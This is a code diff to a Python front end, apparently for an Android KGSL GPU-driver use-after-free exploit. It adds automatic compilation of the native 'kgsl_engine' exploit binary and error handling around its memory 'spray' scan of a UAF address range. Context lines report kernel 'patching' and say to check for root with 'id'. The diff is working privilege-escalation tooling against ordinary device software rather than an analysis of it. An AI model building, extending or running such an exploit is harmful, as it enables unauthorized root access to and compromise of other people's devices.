@@ -3,6 +3,7 @@ import sys
 import time
 import struct
 import subprocess
+import platform
 
 class MemoryExplorerAI:
     def __init__(self):
@@ -201,21 +202,56 @@ class MemoryExplorerAI:
                 print("[+] Patching complete! Verify with 'id' command.")
                 input("Press Enter...")
 
+    def try_compile_engine(self):
+        source_path = self.engine_path + ".c"
+        if os.path.exists(source_path):
+            print(f"[*] Attempting to compile engine for your architecture ({platform.machine()})...")
+            try:
+                # Try both gcc and clang (common in Termux)
+                for compiler in ["gcc", "clang"]:
+                    try:
+                        subprocess.check_call([compiler, "-O2", source_path, "-o", self.engine_path, "-lpthread"])
+                        print(f"[+] Compilation successful using {compiler}!")
+                        return True
+                    except (subprocess.CalledProcessError, FileNotFoundError):
+                        continue
+            except Exception as e:
+                print(f"[-] Compilation failed: {e}")
+        return False
+
     def run(self):
         if not os.path.exists(self.engine_path):
-            print(f"[!] ERROR: Engine not found at {self.engine_path}")
-            print("[*] Please run: gcc -O2 kgsl_engine.c -o kgsl_engine -lpthread")
-            return
+            if not self.try_compile_engine():
+                print(f"[!] ERROR: Engine not found at {self.engine_path}")
+                print("[*] Please run: gcc -O2 kgsl_engine.c -o kgsl_engine -lpthread")
+                return
         
         self.render_tui()
         while True:
-            cmd = input("> ").lower()
+            try:
+                cmd = input("> ").lower()
+            except EOFError:
+                break
+                
             if cmd == 'q':
                 break
             elif cmd == 's':
                 print("[*] Starting GPU Scan (Slow Spray mode)...")
                 scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x1000000)]
-                proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                try:
+                    proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                except OSError as e:
+                    if e.errno == 8: # Exec format error
+                        print("[!] Exec format error detected. Binary is likely for wrong architecture.")
+                        if self.try_compile_engine():
+                            print("[*] Retrying scan with newly compiled engine...")
+                            proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                        else:
+                            print("[-] Auto-compilation failed. Please compile kgsl_engine.c manually on this device.")
+                            continue
+                    else:
+                        print(f"[-] Failed to start engine: {e}")
+                        continue
                 
                 try:
                     for line in proc.stdout:
